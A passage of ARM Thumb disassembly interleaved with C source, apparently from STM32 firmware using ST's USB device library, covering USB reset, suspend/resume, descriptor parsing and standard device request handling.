 800b2de:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2e2:	695b      	ldr	r3, [r3, #20]
 800b2e4:	2b00      	cmp	r3, #0
 800b2e6:	d014      	beq.n	800b312 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b2e8:	7dfa      	ldrb	r2, [r7, #23]
 800b2ea:	68fb      	ldr	r3, [r7, #12]
 800b2ec:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b2f0:	7dfa      	ldrb	r2, [r7, #23]
 800b2f2:	68fb      	ldr	r3, [r7, #12]
 800b2f4:	32ae      	adds	r2, #174	; 0xae
 800b2f6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2fa:	695b      	ldr	r3, [r3, #20]
 800b2fc:	7afa      	ldrb	r2, [r7, #11]
 800b2fe:	4611      	mov	r1, r2
 800b300:	68f8      	ldr	r0, [r7, #12]
 800b302:	4798      	blx	r3
 800b304:	4603      	mov	r3, r0
 800b306:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b308:	7dbb      	ldrb	r3, [r7, #22]
 800b30a:	2b00      	cmp	r3, #0
 800b30c:	d001      	beq.n	800b312 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b30e:	7dbb      	ldrb	r3, [r7, #22]
 800b310:	e000      	b.n	800b314 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b312:	2300      	movs	r3, #0
}
 800b314:	4618      	mov	r0, r3
 800b316:	3718      	adds	r7, #24
 800b318:	46bd      	mov	sp, r7
 800b31a:	bd80      	pop	{r7, pc}

0800b31c <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b31c:	b580      	push	{r7, lr}
 800b31e:	b084      	sub	sp, #16
 800b320:	af00      	add	r7, sp, #0
 800b322:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b324:	2300      	movs	r3, #0
 800b326:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b328:	687b      	ldr	r3, [r7, #4]
 800b32a:	2201      	movs	r2, #1
 800b32c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b330:	687b      	ldr	r3, [r7, #4]
 800b332:	2200      	movs	r2, #0
 800b334:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b338:	687b      	ldr	r3, [r7, #4]
 800b33a:	2200      	movs	r2, #0
 800b33c:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b33e:	687b      	ldr	r3, [r7, #4]
 800b340:	2200      	movs	r2, #0
 800b342:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b346:	687b      	ldr	r3, [r7, #4]
 800b348:	2200      	movs	r2, #0
 800b34a:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b34e:	687b      	ldr	r3, [r7, #4]
 800b350:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b354:	2b00      	cmp	r3, #0
 800b356:	d014      	beq.n	800b382 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b358:	687b      	ldr	r3, [r7, #4]
 800b35a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b35e:	685b      	ldr	r3, [r3, #4]
 800b360:	2b00      	cmp	r3, #0
 800b362:	d00e      	beq.n	800b382 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b364:	687b      	ldr	r3, [r7, #4]
 800b366:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b36a:	685b      	ldr	r3, [r3, #4]
 800b36c:	687a      	ldr	r2, [r7, #4]
 800b36e:	6852      	ldr	r2, [r2, #4]
 800b370:	b2d2      	uxtb	r2, r2
 800b372:	4611      	mov	r1, r2
 800b374:	6878      	ldr	r0, [r7, #4]
 800b376:	4798      	blx	r3
 800b378:	4603      	mov	r3, r0
 800b37a:	2b00      	cmp	r3, #0
 800b37c:	d001      	beq.n	800b382 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b37e:	2303      	movs	r3, #3
 800b380:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b382:	2340      	movs	r3, #64	; 0x40
 800b384:	2200      	movs	r2, #0
 800b386:	2100      	movs	r1, #0
 800b388:	6878      	ldr	r0, [r7, #4]
 800b38a:	f001 fbc3 	bl	800cb14 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b38e:	687b      	ldr	r3, [r7, #4]
 800b390:	2201      	movs	r2, #1
 800b392:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b396:	687b      	ldr	r3, [r7, #4]
 800b398:	2240      	movs	r2, #64	; 0x40
 800b39a:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b39e:	2340      	movs	r3, #64	; 0x40
 800b3a0:	2200      	movs	r2, #0
 800b3a2:	2180      	movs	r1, #128	; 0x80
 800b3a4:	6878      	ldr	r0, [r7, #4]
 800b3a6:	f001 fbb5 	bl	800cb14 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b3aa:	687b      	ldr	r3, [r7, #4]
 800b3ac:	2201      	movs	r2, #1
 800b3ae:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b3b0:	687b      	ldr	r3, [r7, #4]
 800b3b2:	2240      	movs	r2, #64	; 0x40
 800b3b4:	621a      	str	r2, [r3, #32]

  return ret;
 800b3b6:	7bfb      	ldrb	r3, [r7, #15]
}
 800b3b8:	4618      	mov	r0, r3
 800b3ba:	3710      	adds	r7, #16
 800b3bc:	46bd      	mov	sp, r7
 800b3be:	bd80      	pop	{r7, pc}

0800b3c0 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b3c0:	b480      	push	{r7}
 800b3c2:	b083      	sub	sp, #12
 800b3c4:	af00      	add	r7, sp, #0
 800b3c6:	6078      	str	r0, [r7, #4]
 800b3c8:	460b      	mov	r3, r1
 800b3ca:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b3cc:	687b      	ldr	r3, [r7, #4]
 800b3ce:	78fa      	ldrb	r2, [r7, #3]
 800b3d0:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b3d2:	2300      	movs	r3, #0
}
 800b3d4:	4618      	mov	r0, r3
 800b3d6:	370c      	adds	r7, #12
 800b3d8:	46bd      	mov	sp, r7
 800b3da:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3de:	4770      	bx	lr

0800b3e0 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b3e0:	b480      	push	{r7}
 800b3e2:	b083      	sub	sp, #12
 800b3e4:	af00      	add	r7, sp, #0
 800b3e6:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b3e8:	687b      	ldr	r3, [r7, #4]
 800b3ea:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3ee:	b2db      	uxtb	r3, r3
 800b3f0:	2b04      	cmp	r3, #4
 800b3f2:	d006      	beq.n	800b402 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b3f4:	687b      	ldr	r3, [r7, #4]
 800b3f6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3fa:	b2da      	uxtb	r2, r3
 800b3fc:	687b      	ldr	r3, [r7, #4]
 800b3fe:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b402:	687b      	ldr	r3, [r7, #4]
 800b404:	2204      	movs	r2, #4
 800b406:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b40a:	2300      	movs	r3, #0
}
 800b40c:	4618      	mov	r0, r3
 800b40e:	370c      	adds	r7, #12
 800b410:	46bd      	mov	sp, r7
 800b412:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b416:	4770      	bx	lr

0800b418 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b418:	b480      	push	{r7}
 800b41a:	b083      	sub	sp, #12
 800b41c:	af00      	add	r7, sp, #0
 800b41e:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b420:	687b      	ldr	r3, [r7, #4]
 800b422:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b426:	b2db      	uxtb	r3, r3
 800b428:	2b04      	cmp	r3, #4
 800b42a:	d106      	bne.n	800b43a <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b42c:	687b      	ldr	r3, [r7, #4]
 800b42e:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b432:	b2da      	uxtb	r2, r3
 800b434:	687b      	ldr	r3, [r7, #4]
 800b436:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b43a:	2300      	movs	r3, #0
}
 800b43c:	4618      	mov	r0, r3
 800b43e:	370c      	adds	r7, #12
 800b440:	46bd      	mov	sp, r7
 800b442:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b446:	4770      	bx	lr

0800b448 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b448:	b580      	push	{r7, lr}
 800b44a:	b082      	sub	sp, #8
 800b44c:	af00      	add	r7, sp, #0
 800b44e:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b450:	687b      	ldr	r3, [r7, #4]
 800b452:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b456:	b2db      	uxtb	r3, r3
 800b458:	2b03      	cmp	r3, #3
 800b45a:	d110      	bne.n	800b47e <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b45c:	687b      	ldr	r3, [r7, #4]
 800b45e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b462:	2b00      	cmp	r3, #0
 800b464:	d00b      	beq.n	800b47e <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b466:	687b      	ldr	r3, [r7, #4]
 800b468:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b46c:	69db      	ldr	r3, [r3, #28]
 800b46e:	2b00      	cmp	r3, #0
 800b470:	d005      	beq.n	800b47e <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b472:	687b      	ldr	r3, [r7, #4]
 800b474:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b478:	69db      	ldr	r3, [r3, #28]
 800b47a:	6878      	ldr	r0, [r7, #4]
 800b47c:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b47e:	2300      	movs	r3, #0
}
 800b480:	4618      	mov	r0, r3
 800b482:	3708      	adds	r7, #8
 800b484:	46bd      	mov	sp, r7
 800b486:	bd80      	pop	{r7, pc}

0800b488 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b488:	b480      	push	{r7}
 800b48a:	b083      	sub	sp, #12
 800b48c:	af00      	add	r7, sp, #0
 800b48e:	6078      	str	r0, [r7, #4]
 800b490:	460b      	mov	r3, r1
 800b492:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b494:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b496:	4618      	mov	r0, r3
 800b498:	370c      	adds	r7, #12
 800b49a:	46bd      	mov	sp, r7
 800b49c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4a0:	4770      	bx	lr

0800b4a2 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b4a2:	b480      	push	{r7}
 800b4a4:	b083      	sub	sp, #12
 800b4a6:	af00      	add	r7, sp, #0
 800b4a8:	6078      	str	r0, [r7, #4]
 800b4aa:	460b      	mov	r3, r1
 800b4ac:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b4ae:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b4b0:	4618      	mov	r0, r3
 800b4b2:	370c      	adds	r7, #12
 800b4b4:	46bd      	mov	sp, r7
 800b4b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4ba:	4770      	bx	lr

0800b4bc <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b4bc:	b580      	push	{r7, lr}
 800b4be:	b086      	sub	sp, #24
 800b4c0:	af00      	add	r7, sp, #0
 800b4c2:	6078      	str	r0, [r7, #4]
 800b4c4:	460b      	mov	r3, r1
 800b4c6:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b4c8:	687b      	ldr	r3, [r7, #4]
 800b4ca:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b4cc:	687b      	ldr	r3, [r7, #4]
 800b4ce:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b4d0:	2300      	movs	r3, #0
 800b4d2:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b4d4:	68fb      	ldr	r3, [r7, #12]
 800b4d6:	885b      	ldrh	r3, [r3, #2]
 800b4d8:	b29a      	uxth	r2, r3
 800b4da:	68fb      	ldr	r3, [r7, #12]
 800b4dc:	781b      	ldrb	r3, [r3, #0]
 800b4de:	b29b      	uxth	r3, r3
 800b4e0:	429a      	cmp	r2, r3
 800b4e2:	d920      	bls.n	800b526 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b4e4:	68fb      	ldr	r3, [r7, #12]
 800b4e6:	781b      	ldrb	r3, [r3, #0]
 800b4e8:	b29b      	uxth	r3, r3
 800b4ea:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b4ec:	e013      	b.n	800b516 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b4ee:	f107 030a 	add.w	r3, r7, #10
 800b4f2:	4619      	mov	r1, r3
 800b4f4:	6978      	ldr	r0, [r7, #20]
 800b4f6:	f000 f81b 	bl	800b530 <USBD_GetNextDesc>
 800b4fa:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b4fc:	697b      	ldr	r3, [r7, #20]
 800b4fe:	785b      	ldrb	r3, [r3, #1]
 800b500:	2b05      	cmp	r3, #5
 800b502:	d108      	bne.n	800b516 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b504:	697b      	ldr	r3, [r7, #20]
 800b506:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b508:	693b      	ldr	r3, [r7, #16]
 800b50a:	789b      	ldrb	r3, [r3, #2]
 800b50c:	78fa      	ldrb	r2, [r7, #3]
 800b50e:	429a      	cmp	r2, r3
 800b510:	d008      	beq.n	800b524 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b512:	2300      	movs	r3, #0
 800b514:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b516:	68fb      	ldr	r3, [r7, #12]
 800b518:	885b      	ldrh	r3, [r3, #2]
 800b51a:	b29a      	uxth	r2, r3
 800b51c:	897b      	ldrh	r3, [r7, #10]
 800b51e:	429a      	cmp	r2, r3
 800b520:	d8e5      	bhi.n	800b4ee <USBD_GetEpDesc+0x32>
 800b522:	e000      	b.n	800b526 <USBD_GetEpDesc+0x6a>
          break;
 800b524:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b526:	693b      	ldr	r3, [r7, #16]
}
 800b528:	4618      	mov	r0, r3
 800b52a:	3718      	adds	r7, #24
 800b52c:	46bd      	mov	sp, r7
 800b52e:	bd80      	pop	{r7, pc}

0800b530 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b530:	b480      	push	{r7}
 800b532:	b085      	sub	sp, #20
 800b534:	af00      	add	r7, sp, #0
 800b536:	6078      	str	r0, [r7, #4]
 800b538:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b53a:	687b      	ldr	r3, [r7, #4]
 800b53c:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b53e:	683b      	ldr	r3, [r7, #0]
 800b540:	881a      	ldrh	r2, [r3, #0]
 800b542:	68fb      	ldr	r3, [r7, #12]
 800b544:	781b      	ldrb	r3, [r3, #0]
 800b546:	b29b      	uxth	r3, r3
 800b548:	4413      	add	r3, r2
 800b54a:	b29a      	uxth	r2, r3
 800b54c:	683b      	ldr	r3, [r7, #0]
 800b54e:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b550:	68fb      	ldr	r3, [r7, #12]
 800b552:	781b      	ldrb	r3, [r3, #0]
 800b554:	461a      	mov	r2, r3
 800b556:	687b      	ldr	r3, [r7, #4]
 800b558:	4413      	add	r3, r2
 800b55a:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b55c:	68fb      	ldr	r3, [r7, #12]
}
 800b55e:	4618      	mov	r0, r3
 800b560:	3714      	adds	r7, #20
 800b562:	46bd      	mov	sp, r7
 800b564:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b568:	4770      	bx	lr

0800b56a <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b56a:	b480      	push	{r7}
 800b56c:	b087      	sub	sp, #28
 800b56e:	af00      	add	r7, sp, #0
 800b570:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b572:	687b      	ldr	r3, [r7, #4]
 800b574:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b576:	697b      	ldr	r3, [r7, #20]
 800b578:	781b      	ldrb	r3, [r3, #0]
 800b57a:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b57c:	697b      	ldr	r3, [r7, #20]
 800b57e:	3301      	adds	r3, #1
 800b580:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b582:	697b      	ldr	r3, [r7, #20]
 800b584:	781b      	ldrb	r3, [r3, #0]
 800b586:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b588:	8a3b      	ldrh	r3, [r7, #16]
 800b58a:	021b      	lsls	r3, r3, #8
 800b58c:	b21a      	sxth	r2, r3
 800b58e:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b592:	4313      	orrs	r3, r2
 800b594:	b21b      	sxth	r3, r3
 800b596:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b598:	89fb      	ldrh	r3, [r7, #14]
}
 800b59a:	4618      	mov	r0, r3
 800b59c:	371c      	adds	r7, #28
 800b59e:	46bd      	mov	sp, r7
 800b5a0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b5a4:	4770      	bx	lr
	...

0800b5a8 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b5a8:	b580      	push	{r7, lr}
 800b5aa:	b084      	sub	sp, #16
 800b5ac:	af00      	add	r7, sp, #0
 800b5ae:	6078      	str	r0, [r7, #4]
 800b5b0:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b5b2:	2300      	movs	r3, #0
 800b5b4:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b5b6:	683b      	ldr	r3, [r7, #0]
 800b5b8:	781b      	ldrb	r3, [r3, #0]
 800b5ba:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b5be:	2b40      	cmp	r3, #64	; 0x40
 800b5c0:	d005      	beq.n	800b5ce <USBD_StdDevReq+0x26>
 800b5c2:	2b40      	cmp	r3, #64	; 0x40
 800b5c4:	d857      	bhi.n	800b676 <USBD_StdDevReq+0xce>
 800b5c6:	2b00      	cmp	r3, #0
 800b5c8:	d00f      	beq.n	800b5ea <USBD_StdDevReq+0x42>
 800b5ca:	2b20      	cmp	r3, #32
 800b5cc:	d153      	bne.n	800b676 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b5ce:	687b      	ldr	r3, [r7, #4]
 800b5d0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b5d4:	687b      	ldr	r3, [r7, #4]
 800b5d6:	32ae      	adds	r2, #174	; 0xae
 800b5d8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b5dc:	689b      	ldr	r3, [r3, #8]
 800b5de:	6839      	ldr	r1, [r7, #0]
 800b5e0:	6878      	ldr	r0, [r7, #4]
 800b5e2:	4798      	blx	r3
 800b5e4:	4603      	mov	r3, r0
 800b5e6:	73fb      	strb	r3, [r7, #15]
      break;
 800b5e8:	e04a      	b.n	800b680 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b5ea:	683b      	ldr	r3, [r7, #0]
 800b5ec:	785b      	ldrb	r3, [r3, #1]
 800b5ee:	2b09      	cmp	r3, #9
 800b5f0:	d83b      	bhi.n	800b66a <USBD_StdDevReq+0xc2>
 800b5f2:	a201      	add	r2, pc, #4	; (adr r2, 800b5f8 <USBD_StdDevReq+0x50>)
 800b5f4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b5f8:	0800b64d 	.word	0x0800b64d
 800b5fc:	0800b661 	.word	0x0800b661
 800b600:	0800b66b 	.word	0x0800b66b
 800b604:	0800b657 	.word	0x0800b657
 800b608:	0800b66b 	.word	0x0800b66b
 800b60c:	0800b62b 	.word	0x0800b62b
 800b610:	0800b621 	.word	0x0800b621
 800b614:	0800b66b 	.word	0x0800b66b
 800b618:	0800b643 	.word	0x0800b643
 800b61c:	0800b635 	.word	0x0800b635
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b620:	6839      	ldr	r1, [r7, #0]
 800b622:	6878      	ldr	r0, [r7, #4]
 800b624:	f000 fa3c 	bl	800baa0 <USBD_GetDescriptor>
          break;
 800b628:	e024      	b.n	800b674 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b62a:	6839      	ldr	r1, [r7, #0]
 800b62c:	6878      	ldr	r0, [r7, #4]
 800b62e:	f000 fbcb 	bl	800bdc8 <USBD_SetAddress>
          break;
 800b632:	e01f      	b.n	800b674 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b634:	6839      	ldr	r1, [r7, #0]
 800b636:	6878      	ldr	r0, [r7, #4]
 800b638:	f000 fc0a 	bl	800be50 <USBD_SetConfig>
 800b63c:	4603      	mov	r3, r0
 800b63e:	73fb      	strb	r3, [r7, #15]
          break;
 800b640:	e018      	b.n	800b674 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b642:	6839      	ldr	r1, [r7, #0]
 800b644:	6878      	ldr	r0, [r7, #4]
 800b646:	f000 fcad 	bl	800bfa4 <USBD_GetConfig>
          break;
 800b64a:	e013      	b.n	800b674 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b64c:	6839      	ldr	r1, [r7, #0]
 800b64e:	6878      	ldr	r0, [r7, #4]
 800b650:	f000 fcde 	bl	800c010 <USBD_GetStatus>
          break;
 800b654:	e00e      	b.n	800b674 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b656:	6839      	ldr	r1, [r7, #0]
 800b658:	6878      	ldr	r0, [r7, #4]
 800b65a:	f000 fd0d 	bl	800c078 <USBD_SetFeature>
          break;
 800b65e:	e009      	b.n	800b674 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b660:	6839      	ldr	r1, [r7, #0]
 800b662:	6878      	ldr	r0, [r7, #4]
 800b664:	f000 fd31 	bl	800c0ca <USBD_ClrFeature>
          break;
 800b668:	e004      	b.n	800b674 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b66a:	6839      	ldr	r1, [r7, #0]
 800b66c:	6878      	ldr	r0, [r7, #4]
 800b66e:	f000 fd88 	bl	800c182 <USBD_CtlError>
          break;
 800b672:	bf00      	nop
      }
      break;
 800b674:	e004      	b.n	800b680 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b676:	6839      	ldr	r1, [r7, #0]
 800b678:	6878      	ldr	r0, [r7, #4]
 800b67a:	f000 fd82 	bl	800c182 <USBD_CtlError>
      break;
 800b67e:	bf00      	nop
  }

  return ret;
 800b680:	7bfb      	ldrb	r3, [r7, #15]
}
 800b682:	4618      	mov	r0, r3
 800b684:	3710      	adds	r7, #16
 800b686:	46bd      	mov	sp, r7
 800b688:	bd80      	pop	{r7, pc}
 800b68a:	bf00      	nop

0800b68c <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b68c:	b580      	push	{r7, lr}
 800b68e:	b084      	sub	sp, #16
 800b690:	af00      	add	r7, sp, #0
 800b692:	6078      	str	r0, [r7, #4]
 800b694:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b696:	2300      	movs	r3, #0
 800b698:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b69a:	683b      	ldr	r3, [r7, #0]
 800b69c:	781b      	ldrb	r3, [r3, #0]
 800b69e:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b6a2:	2b40      	cmp	r3, #64	; 0x40
 800b6a4:	d005      	beq.n	800b6b2 <USBD_StdItfReq+0x26>
 800b6a6:	2b40      	cmp	r3, #64	; 0x40
 800b6a8:	d852      	bhi.n	800b750 <USBD_StdItfReq+0xc4>
 800b6aa:	2b00      	cmp	r3, #0
 800b6ac:	d001      	beq.n	800b6b2 <USBD_StdItfReq+0x26>
 800b6ae:	2b20      	cmp	r3, #32
 800b6b0:	d14e      	bne.n	800b750 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
